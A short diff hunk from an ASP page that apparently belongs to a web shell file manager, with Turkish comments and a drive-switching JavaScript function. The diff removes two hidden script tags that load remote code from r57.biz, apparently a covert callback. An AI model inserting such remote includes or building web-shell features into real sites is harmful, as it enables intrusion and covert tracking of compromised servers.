@@ -1066,14 +1066,12 @@ Response.Write endcode
 if showdisks then
 
 %>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 	<script language=javascript>
 		// DRIVE ISLEMLERI
 		function driveGo(drive_){
 			location = "?raiz="+drive_+":";
 		}
 	</script>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 
 <%
 
